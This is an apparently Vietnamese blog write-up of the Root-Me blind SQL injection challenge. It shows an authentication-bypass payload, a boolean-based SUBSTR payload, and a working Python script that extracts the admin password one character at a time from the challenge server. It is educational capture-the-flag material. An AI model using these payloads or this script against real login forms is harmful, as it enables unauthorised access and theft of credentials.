<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-sql1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    [SQLi] SQLi Blind
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Authentication v 0.02</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the administrator password.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Trang web chỉ có chức năng đăng nhập,ta test thử payload bypass authentication như:</p>
                <blockquote>
                    <p>admin' or 1=1 --#</p>
                </blockquote>
                <p>Thì thấy trên thành công:<br>Welcome back user1 !<br>Your informations :</p>
                <ul>
                    <li>username : user1</li>
                </ul>
                <p>Nhưng điều quan trọng là ta muốn biết mật khẩu của user admin,chứ không phải bypass authentication.<br>Như mình đã trình bày trong rất nhiều bài trước, bypass được chỗ này là do <strong>True or True = True</strong>.<br>Ta thay OR bằng AND<br>Rồi dùng kỹ thuật <strong>Boolean Based SQLi</strong> để blind ra database.</p>
                <ul>
                    <li>Nếu đăng nhập thành công,tức là True And True</li>
                    <li>Nếu không thành công,tức là True And False</li>
                </ul>
                <p>Payload có mẫu như sau:</p>
                <blockquote>
                    <p>admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='e' -- -</p>
                </blockquote>
                <h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2>
                <figure class="highlight python">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">URL = <span class="string">"http://challenge01.root-me.org/web-serveur/ch10/index.php"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">		payload = <span class="string">"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),"</span>+str(index)+<span class="string">",1)='"</span>+char+<span class="string">"' --"</span></span><br><span class="line">		data = {<span class="string">"username"</span>:payload, <span class="string">"password"</span>:<span class="string">"whatever"</span>}</span><br><span class="line">		r = requests.post(URL,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your informations'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			password += char</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>